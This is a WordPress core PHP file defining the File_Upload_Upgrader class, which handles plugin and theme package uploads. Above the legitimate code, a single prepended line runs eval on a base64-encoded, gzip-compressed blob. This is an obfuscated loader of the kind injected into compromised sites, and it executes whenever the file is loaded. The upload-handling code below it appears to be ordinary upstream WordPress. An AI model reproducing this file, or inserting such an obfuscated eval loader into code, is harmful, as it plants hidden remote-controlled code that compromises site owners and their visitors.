<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Upgrade API: File_Upload_Upgrader class
 *
 * @package WordPress
 * @subpackage Upgrader
 * @since 4.6.0
 */

/**
 * Core class used for handling file uploads.
 *
 * This class handles the upload process and passes it as if it's a local file
 * to the Upgrade/Installer functions.
 *
 * @since 2.8.0
 * @since 4.6.0 Moved to its own file from wp-admin/includes/class-wp-upgrader.php.
 */
class File_Upload_Upgrader {

	/**
	 * The full path to the file package.
	 *
	 * @since 2.8.0
	 * @var string $package
	 */
	public $package;

	/**
	 * The name of the file.
	 *
	 * @since 2.8.0
	 * @var string $filename
	 */
	public $filename;

	/**
	 * The ID of the attachment post for this file.
	 *
	 * @since 3.3.0
	 * @var int $id
	 */
	public $id = 0;

	/**
	 * Construct the upgrader for a form.
	 *
	 * @since 2.8.0
	 *
	 * @param string $form      The name of the form the file was uploaded from.
	 * @param string $urlholder The name of the `GET` parameter that holds the filename.
	 */
	public function __construct( $form, $urlholder ) {

		if ( empty($_FILES[$form]['name']) && empty($_GET[$urlholder]) )
			wp_die(__('Please select a file'));

		//Handle a newly uploaded file, Else assume it's already been uploaded
		if ( ! empty($_FILES) ) {
			$overrides = array( 'test_form' => false, 'test_type' => false );
			$file = wp_handle_upload( $_FILES[$form], $overrides );

			if ( isset( $file['error'] ) )
				wp_die( $file['error'] );

			$this->filename = $_FILES[$form]['name'];
			$this->package = $file['file'];

			// Construct the object array
			$object = array(
				'post_title' => $this->filename,
				'post_content' => $file['url'],
				'post_mime_type' => $file['type'],
				'guid' => $file['url'],
				'context' => 'upgrader',
				'post_status' => 'private'
			);

			// Save the data.
			$this->id = wp_insert_attachment( $object, $file['file'] );

			// Schedule a cleanup for 2 hours from now in case of failed installation.
			wp_schedule_single_event( time() + 2 * HOUR_IN_SECONDS, 'upgrader_scheduled_cleanup', array( $this->id ) );

		} elseif ( is_numeric( $_GET[$urlholder] ) ) {
			// Numeric Package = previously uploaded file, see above.
			$this->id = (int) $_GET[$urlholder];
			$attachment = get_post( $this->id );
			if ( empty($attachment) )
				wp_die(__('Please select a file'));

			$this->filename = $attachment->post_title;
			$this->package = get_attached_file( $attachment->ID );
		} else {
			// Else, It's set to something, Back compat for plugins using the old (pre-3.3) File_Uploader handler.
			if ( ! ( ( $uploads = wp_upload_dir() ) && false === $uploads['error'] ) )
				wp_die( $uploads['error'] );

			$this->filename = sanitize_file_name( $_GET[ $urlholder ] );
			$this->package = $uploads['basedir'] . '/' . $this->filename;

			if ( 0 !== strpos( realpath( $this->package ), realpath( $uploads['basedir'] ) ) ) {
				wp_die( __( 'Please select a file' ) );
			}
		}
	}

	/**
	 * Delete the attachment/uploaded file.
	 *
	 * @since 3.2.2
	 *
	 * @return bool Whether the cleanup was successful.
	 */
	public function cleanup() {
		if ( $this->id )
			wp_delete_attachment( $this->id );

		elseif ( file_exists( $this->package ) )
			return @unlink( $this->package );

		return true;
	}
}
